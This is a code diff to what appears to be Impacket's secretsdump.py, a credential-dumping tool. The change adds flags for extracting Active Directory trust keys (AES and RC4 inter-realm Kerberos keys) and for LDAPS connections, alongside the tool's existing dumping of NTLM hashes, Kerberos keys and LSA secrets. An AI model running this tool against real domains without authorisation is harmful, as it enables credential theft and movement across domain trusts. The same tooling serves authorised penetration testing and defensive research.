@@ -50,8 +50,6 @@
 #   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
 #
 
-from __future__ import division
-from __future__ import print_function
 import argparse
 import codecs
 import logging
@@ -93,6 +91,8 @@ class DumpSecrets:
         self.__NTDSHashes = None
         self.__LSASecrets = None
         self.__KeyListSecrets = None
+        self.__trustKeys = options.trust_keys
+        self.__justTrustKeys = options.just_trust_keys
         self.__rodc = options.rodcNo
         self.__systemHive = options.system
         self.__bootkey = options.bootkey
@@ -110,6 +110,7 @@ class DumpSecrets:
         self.__justDCNTLM = options.just_dc_ntlm
         self.__justUser = options.just_dc_user
         self.__ldapFilter = options.ldapfilter
+        self.__ldaps = options.ldaps
         self.__skipUser = options.skip_user
         self.__pwdLastSet = options.pwd_last_set
         self.__printUserStatus = options.user_status
@@ -155,14 +156,15 @@ class DumpSecrets:
         self.baseDN = self.baseDN[:-1]
 
         try:
-            self.__ldapConnection = LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcHost)
+            protocol = 'ldaps' if self.__ldaps else 'ldap'
+            self.__ldapConnection = LDAPConnection('%s://%s' % (protocol, self.__target), self.baseDN, self.__kdcHost)
             if self.__doKerberos is not True:
                 self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
             else:
                 self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                     self.__aesKey, kdcHost=self.__kdcHost)
         except LDAPSessionError as e:
-            if str(e).find('strongerAuthRequired') >= 0:
+            if not self.__ldaps and str(e).find('strongerAuthRequired') >= 0:
                 # We need to try SSL
                 self.__ldapConnection = LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcHost)
                 if self.__doKerberos is not True:
@@ -175,6 +177,7 @@ class DumpSecrets:
 
     def dump(self):
         try:
+            localDomainSid = None
             # Almost like LOCAL but create (and deletes it after finishing) a Shadow Snapshot at target and download SAM, SYSTEM and SECURITY from the SS. No Code Execution.
             # If specified, NTDS will be also downloaded and parsed (no code execution needed, in contrast to vssadmin method). Use it when targeting a DC.
             # Then, parse locally
@@ -293,7 +296,8 @@ class DumpSecrets:
                                 SECURITYFileName = self.__securityHive
 
                             self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
-                                                           isRemote=self.__isRemote, history=self.__history)
+                                                           isRemote=self.__isRemote, history=self.__history,
+                                                           systemHive=self.__systemHive)
                             self.__LSASecrets.dumpCachedHashes()
                             if self.__outputFileName is not None:
                                 self.__LSASecrets.exportCached(self.__outputFileName)
@@ -315,13 +319,24 @@ class DumpSecrets:
                 else:
                     NTDSFileName = self.__ntdsFile
 
+                if NTDSFileName is not None:
+                    try:
+                        if self.__isRemote is True:
+                            localDomainSid = self.__remoteOps.getDomainSid()
+                        else:
+                            localDomainSid = NTDSHashes.getLocalDomainSid(NTDSFileName)
+                    except Exception as e:
+                        logging.debug('Failed to resolve local domain SID: %s', e)
+
                 self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
                                                noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                                useVSSMethod=self.__useVSSMethod, remoteSSMethodWMINTDS=self.__remoteSSWMINTDS, justNTLM=self.__justDCNTLM,
                                                pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                                outputFileName=self.__outputFileName, justUser=self.__justUser,
                                                skipUser=self.__skipUser, ldapFilter=self.__ldapFilter,
-                                               printUserStatus=self.__printUserStatus)
+                                               printUserStatus=self.__printUserStatus, localDomainSid=localDomainSid,
+                                               trustKeys=self.__trustKeys, domainFQDN=self.__domain,
+                                               justTrustKeys=self.__justTrustKeys, securityHive=self.__securityHive)
                 try:
                     self.__NTDSHashes.dump()
                 except Exception as e:
@@ -440,13 +455,19 @@ if __name__ == '__main__':
                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
     group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes only)')
+    group.add_argument('-trust-keys', action='store_true', default=False,
+                       help='Dump trusted domain object (TDO) secrets and derive the inter-realm '
+                            'Kerberos keys (AES + RC4) for each trust direction')
+    group.add_argument('-just-trust-keys', action='store_true', default=False,
+                       help='Like -trust-keys but dump ONLY the trust keys, skipping every account secret')
     group.add_argument('-skip-user', action='store', help='Do NOT extract NTDS.DIT data for the user specified. '
                        'Can provide comma-separated list of users to skip, or text file with one user per line')
     group.add_argument('-pwd-last-set', action='store_true', default=False,
                        help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
     group.add_argument('-user-status', action='store_true', default=False,
                        help='Display whether or not the user is disabled')
-    group.add_argument('-history', action='store_true', help='Dump password history (NTDS and SAM hashes), and LSA secrets OldVal')
+    group.add_argument('-history', action='store_true',
+                       help='Dump password history (NTDS and SAM hashes), LSA secrets OldVal, and previous trust keys')
 
     group = parser.add_argument_group('authentication')
     group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
@@ -464,6 +485,8 @@ if __name__ == '__main__':
     group.add_argument('-target-ip', action='store', metavar="ip address",
                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                             'This is useful when target is the NetBIOS name and you cannot resolve it')
+    group.add_argument('-ldaps', '-use-ldaps', dest='ldaps', action='store_true',
+                       help='Use LDAPS instead of LDAP for directory queries')
 
     if len(sys.argv) == 1:
         parser.print_help()
@@ -489,6 +512,15 @@ if __name__ == '__main__':
         else:
             # Having this switch on implies not asking for anything else.
             options.just_dc = True
+
+    if options.just_trust_keys is True:
+        # Dumping only the trust keys implies the trust-keys logic and skips SAM/LSA/account secrets.
+        options.trust_keys = True
+        options.just_dc = True
+
+    if (options.trust_keys is True or options.just_trust_keys is True) and options.use_keylist is True:
+        logging.error('-trust-keys/-just-trust-keys are not supported together with -use-keylist')
+        sys.exit(1)
 
     if (options.use_vss is True or options.use_remoteSSWMI_NTDS is True) and options.resumefile is not None:
         logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode nor WMI VSS mode')
